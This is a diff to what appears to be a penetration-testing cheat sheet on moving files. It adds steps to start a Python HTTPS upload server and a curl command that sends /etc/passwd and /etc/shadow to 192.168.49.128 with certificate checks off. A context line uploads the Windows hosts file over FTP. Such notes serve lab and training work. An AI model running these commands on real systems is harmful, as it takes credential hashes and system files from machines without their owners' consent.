@@ -229,6 +229,15 @@ Upload using ftp:
 
 	(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
 
+Upload using python:
+
+	pip install --user uploadserver
+	openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+	python3 -m uploadserver 443 --server-certificate ~/server.pem
+
+	curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
+
+
 Good dir to save, download and write files:
 
 	C:\Users\Public\
